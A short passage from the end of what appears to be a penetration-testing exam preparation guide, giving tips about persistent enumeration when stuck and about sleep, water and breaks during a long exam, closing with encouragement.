   If you're stuck — you're missing something in enumeration.
   Not trying hard enough ≠ not enumerating enough.

8. PHYSICAL CONDITION MATTERS
   Sleep. Water. Movement. Breaks.
   Your brain on hour 16 is significantly worse than hour 4.
   Build breaks into your plan before you need them.

GOOD LUCK. YOU'VE GOT THIS.
```

</details>

